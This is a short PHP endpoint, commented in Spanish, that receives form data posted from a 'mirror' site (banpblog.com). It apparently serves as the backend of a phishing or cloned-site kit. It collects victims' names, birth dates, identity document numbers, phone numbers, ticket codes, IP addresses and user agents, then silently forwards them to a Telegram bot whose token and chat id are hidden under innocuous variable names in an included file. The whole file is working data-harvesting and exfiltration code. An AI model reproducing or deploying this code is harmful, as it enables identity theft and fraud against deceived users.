<?php
/* Endpoint para notificación de participación desde el espejo */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: https://banpblog.com');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false]);
    exit;
}

include("oslo.php");

$raw = file_get_contents('php://input');
$data = json_decode($raw, true) ?: [];

$nombre  = trim(substr($data['nombre']  ?? '', 0, 100));
$fnac    = trim(substr($data['fnac']    ?? '', 0, 20));
$doc     = trim(substr($data['doc']     ?? '', 0, 30));
$tel     = trim(substr($data['tel']     ?? '', 0, 25));
$ticket  = trim(substr($data['ref']     ?? ($data['ticket'] ?? ''), 0, 20));

$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
if (strpos($ip, ',') !== false) {
    $ip = trim(explode(',', $ip)[0]);
}
$ua = substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 200);

$msg  = "🟢 NUEVO PARTICIPANTE\n";
$msg .= "👤 Nombre: $nombre\n";
$msg .= "📅 F. Nac: $fnac\n";
$msg .= "🪪 Documento: $doc\n";
$msg .= "📱 Teléfono: $tel\n";
$msg .= "🎫 Ticket: $ticket\n";
$msg .= "🌐 IP: $ip\n";
$msg .= "💻 UA: $ua";

$ctx = stream_context_create(['http' => ['timeout' => 4]]);
@file_get_contents(
    "https://api.telegram.org/bot$ambar/sendMessage?" . http_build_query([
        'chat_id' => $koala,
        'text'    => $msg
    ]),
    false,
    $ctx
);

echo json_encode(['ok' => true]);
